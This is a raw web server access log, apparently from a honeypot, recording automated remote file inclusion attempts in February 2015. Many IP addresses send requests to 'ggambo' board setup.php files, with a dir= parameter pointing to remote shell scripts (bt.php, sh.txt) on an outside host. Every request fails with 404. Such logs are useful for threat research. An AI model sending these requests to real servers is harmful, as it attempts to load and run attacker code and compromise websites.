91.121.6.123 - - [13/Feb/2015:15:31:40 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
91.121.6.123 - - [13/Feb/2015:15:31:40 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
91.121.6.123 - - [13/Feb/2015:15:31:41 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
176.31.252.38 - - [13/Feb/2015:15:31:50 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [13/Feb/2015:15:31:50 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [13/Feb/2015:15:31:51 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [13/Feb/2015:15:31:51 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [13/Feb/2015:15:31:51 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [13/Feb/2015:15:31:52 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [13/Feb/2015:15:31:53 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [13/Feb/2015:15:31:53 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
203.58.0.155 - - [13/Feb/2015:15:34:02 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "IlTrovatore-Setaccio/1.2 (http://www.iltrovatore.it/aiuto/faq.html)" 
203.58.0.155 - - [13/Feb/2015:15:34:03 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "IlTrovatore-Setaccio/1.2 (http://www.iltrovatore.it/aiuto/faq.html)" 
203.58.0.155 - - [13/Feb/2015:15:34:04 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "IlTrovatore-Setaccio/1.2 (http://www.iltrovatore.it/aiuto/faq.html)" 
203.58.0.155 - - [13/Feb/2015:15:34:06 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "IlTrovatore-Setaccio/1.2 (http://www.iltrovatore.it/aiuto/faq.html)" 
1.224.163.80 - - [13/Feb/2015:15:34:06 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
1.224.163.80 - - [13/Feb/2015:15:34:06 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
203.58.0.155 - - [13/Feb/2015:15:34:06 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "IlTrovatore-Setaccio/1.2 (http://www.iltrovatore.it/aiuto/faq.html)" 
1.224.163.80 - - [13/Feb/2015:15:34:08 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
1.224.163.80 - - [13/Feb/2015:15:34:08 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
203.58.0.155 - - [13/Feb/2015:15:34:08 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "IlTrovatore-Setaccio/1.2 (http://www.iltrovatore.it/aiuto/faq.html)" 
1.224.163.80 - - [13/Feb/2015:15:34:08 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
1.224.163.80 - - [13/Feb/2015:15:34:08 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
203.58.0.155 - - [13/Feb/2015:15:34:08 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "IlTrovatore-Setaccio/1.2 (http://www.iltrovatore.it/aiuto/faq.html)" 
1.224.163.80 - - [13/Feb/2015:15:34:10 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
1.224.163.80 - - [13/Feb/2015:15:34:10 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
203.58.0.155 - - [13/Feb/2015:15:34:10 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "IlTrovatore-Setaccio/1.2 (http://www.iltrovatore.it/aiuto/faq.html)" 
176.31.252.38 - - [13/Feb/2015:15:36:51 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [13/Feb/2015:15:36:52 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [13/Feb/2015:15:36:52 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [13/Feb/2015:15:36:54 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [13/Feb/2015:15:36:58 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [13/Feb/2015:15:36:58 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [13/Feb/2015:15:36:59 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [13/Feb/2015:15:36:59 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [13/Feb/2015:15:36:59 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [13/Feb/2015:15:36:59 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [13/Feb/2015:15:37:00 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [13/Feb/2015:15:37:01 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
71.6.150.241 - - [13/Feb/2015:15:40:04 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
71.6.150.241 - - [13/Feb/2015:15:40:04 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
71.6.150.241 - - [13/Feb/2015:15:40:04 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
71.6.150.241 - - [13/Feb/2015:15:40:04 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
71.6.150.241 - - [13/Feb/2015:15:40:05 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
71.6.150.241 - - [13/Feb/2015:15:40:05 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
71.6.150.241 - - [13/Feb/2015:15:40:05 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
71.6.150.241 - - [13/Feb/2015:15:40:05 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
71.6.150.241 - - [13/Feb/2015:15:40:05 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
71.6.150.241 - - [13/Feb/2015:15:40:05 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
71.6.150.241 - - [13/Feb/2015:15:40:05 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
71.6.150.241 - - [13/Feb/2015:15:40:05 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
71.6.150.241 - - [13/Feb/2015:15:40:06 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
71.6.150.241 - - [13/Feb/2015:15:40:06 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
71.6.150.241 - - [13/Feb/2015:15:40:06 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
71.6.150.241 - - [13/Feb/2015:15:40:06 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
112.218.68.155 - - [13/Feb/2015:15:40:44 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
112.218.68.155 - - [13/Feb/2015:15:40:44 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
112.218.68.155 - - [13/Feb/2015:15:40:46 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
112.218.68.155 - - [13/Feb/2015:15:40:46 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
112.218.68.155 - - [13/Feb/2015:15:40:46 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
112.218.68.155 - - [13/Feb/2015:15:40:46 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
112.218.68.155 - - [13/Feb/2015:15:40:48 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
112.218.68.155 - - [13/Feb/2015:15:40:48 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
91.121.6.123 - - [13/Feb/2015:15:41:33 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
91.121.6.123 - - [13/Feb/2015:15:41:34 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
91.121.6.123 - - [13/Feb/2015:15:41:35 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
91.121.6.123 - - [13/Feb/2015:15:41:36 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
91.121.6.123 - - [13/Feb/2015:15:41:36 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
91.121.6.123 - - [13/Feb/2015:15:41:37 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
91.121.6.123 - - [13/Feb/2015:15:41:37 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
91.121.6.123 - - [13/Feb/2015:15:41:39 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
174.136.14.201 - - [13/Feb/2015:15:51:12 -0800] "GET /honeypot////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
174.136.14.201 - - [13/Feb/2015:15:51:12 -0800] "GET /honeypot////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
174.136.14.201 - - [13/Feb/2015:15:51:13 -0800] "GET /honeypot////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
174.136.14.201 - - [13/Feb/2015:15:51:13 -0800] "POST /honeypot////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
174.136.14.201 - - [13/Feb/2015:15:51:13 -0800] "GET /honeypot////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
174.136.14.201 - - [13/Feb/2015:15:51:13 -0800] "POST /honeypot////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
174.136.14.201 - - [13/Feb/2015:15:51:14 -0800] "POST /honeypot////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
174.136.14.201 - - [13/Feb/2015:15:51:14 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
174.136.14.201 - - [13/Feb/2015:15:51:14 -0800] "POST /honeypot////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
174.136.14.201 - - [13/Feb/2015:15:51:14 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
174.136.14.201 - - [13/Feb/2015:15:51:15 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
174.136.14.201 - - [13/Feb/2015:15:51:15 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
174.136.14.201 - - [13/Feb/2015:15:51:15 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
174.136.14.201 - - [13/Feb/2015:15:51:15 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
174.136.14.201 - - [13/Feb/2015:15:51:16 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
174.136.14.201 - - [13/Feb/2015:15:51:16 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
46.229.170.197 - - [13/Feb/2015:15:51:28 -0800] "GET / HTTP/1.1" 200 21915 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20110324 Firefox/4.2a1pre" 
181.65.186.35 - - [13/Feb/2015:16:07:47 -0800] "GET /honeypot////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [13/Feb/2015:16:07:49 -0800] "GET /honeypot////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [13/Feb/2015:16:07:49 -0800] "POST /honeypot////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [13/Feb/2015:16:07:50 -0800] "GET /honeypot////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [13/Feb/2015:16:07:50 -0800] "POST /honeypot////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [13/Feb/2015:16:07:50 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [13/Feb/2015:16:07:51 -0800] "GET /honeypot////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [13/Feb/2015:16:07:51 -0800] "POST /honeypot////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [13/Feb/2015:16:07:52 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [13/Feb/2015:16:07:52 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [13/Feb/2015:16:07:52 -0800] "POST /honeypot////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [13/Feb/2015:16:07:53 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [13/Feb/2015:16:07:53 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [13/Feb/2015:16:07:54 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [13/Feb/2015:16:07:54 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [13/Feb/2015:16:07:56 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
176.31.252.38 - - [13/Feb/2015:16:08:13 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [13/Feb/2015:16:08:14 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [13/Feb/2015:16:08:14 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [13/Feb/2015:16:08:15 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
